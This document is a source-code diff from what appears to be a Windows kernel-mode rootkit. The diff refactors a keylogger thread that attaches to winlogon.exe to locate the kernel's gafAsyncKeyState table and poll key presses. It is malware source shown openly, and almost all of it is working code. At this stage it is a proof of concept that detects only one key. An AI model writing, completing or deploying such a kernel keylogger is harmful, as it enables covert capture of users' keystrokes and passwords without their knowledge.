@@ -78,7 +78,7 @@ BeWasKeyPressed(UINT8 vk)
  * @returns UINT64 address of gafAsyncKeyState
  */
 PVOID
-BeGetGafAsyncKeyStateAddress(PEPROCESS targetProc)
+BeGetGafAsyncKeyStateAddress()
 {
 	// TODO FIXME: THIS IS WINDOWS <= 10 ONLY
 
@@ -87,8 +87,10 @@ BeGetGafAsyncKeyStateAddress(PEPROCESS targetProc)
 	// Get Address of NtUserGetAsyncKeyState
 	DWORD64 ntUserGetAsyncKeyState = (DWORD64)BeGetSystemRoutineAddress(Win32kBase, "NtUserGetAsyncKeyState");
 	LOG_MSG("NtUserGetAsyncKeyState: 0x%llx\n", ntUserGetAsyncKeyState);
-
-	KeStackAttachProcess(targetProc, &apc);
+	
+	// To read session driver modules (such as win32kbase.sys, which contains NtUserGetAsyncKeyState), we need a process running in a user session 
+	// https://www.unknowncheats.me/forum/general-programming-and-reversing/492970-reading-memory-win32kbase-sys.html
+	KeStackAttachProcess(BeGlobals::winLogonProc, &apc);
 
 	PVOID address = 0;
 	INT i = 0;
@@ -131,28 +133,13 @@ BeKeyLoggerFunction(IN PVOID StartContext)
 {
 	UNREFERENCED_PARAMETER(StartContext);
 
-	// To read session driver modules (such as win32kbase.sys, which contains NtUserGetAsyncKeyState), we need a process running in a user session // TODO refactor to dedicated function
-	// https://www.unknowncheats.me/forum/general-programming-and-reversing/492970-reading-memory-win32kbase-sys.html
-	KAPC_STATE apc;
-	PEPROCESS targetProc = 0;
-	UNICODE_STRING processName;
-	RtlInitUnicodeString(&processName, L"winlogon.exe");
-	HANDLE procId = BeGetPidFromProcessName(processName); 
-	LOG_MSG("Found winlogon PID: %i\n", procId);
-	if (PsLookupProcessByProcessId(procId, &targetProc) != 0)
-	{
-		ObDereferenceObject(targetProc);
-		PsTerminateSystemThread(STATUS_NOT_FOUND);
-		return;
-	}
-
-	PVOID gasAsyncKeyStateAddr = BeGetGafAsyncKeyStateAddress(targetProc);
+	PVOID gasAsyncKeyStateAddr = BeGetGafAsyncKeyStateAddress();
 
 	while(true)
 	{
 		if (BeGlobals::logKeys)
 		{
-			BeUpdateKeyStateMap(procId, gasAsyncKeyStateAddr);
+			BeUpdateKeyStateMap(BeGlobals::winLogonPid, gasAsyncKeyStateAddr);
 
 			// POC: just check for A. TODO: log all keys
 			if (BeWasKeyPressed(0x41))
@@ -163,7 +150,6 @@ BeKeyLoggerFunction(IN PVOID StartContext)
 		
 		if (BeGlobals::shutdown)
 		{
-			ObDereferenceObject(targetProc);
 			PsTerminateSystemThread(STATUS_SUCCESS);
 		}
 
